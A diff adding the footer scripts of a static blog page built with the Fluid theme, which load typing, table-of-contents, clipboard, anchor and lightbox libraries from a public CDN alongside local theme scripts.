+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
